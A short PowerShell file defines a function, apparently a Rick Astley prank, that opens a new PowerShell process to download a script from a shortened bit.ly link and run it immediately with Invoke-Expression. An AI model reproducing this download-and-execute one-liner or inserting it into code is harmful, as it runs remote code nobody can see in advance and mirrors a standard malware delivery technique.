
<#
    .SYNOPSIS
    Play the fun tool of Rick Astley.
#>
function Start-RickAstley
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    param ()

    Start-Process -FilePath 'powershell.exe' -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')'
}
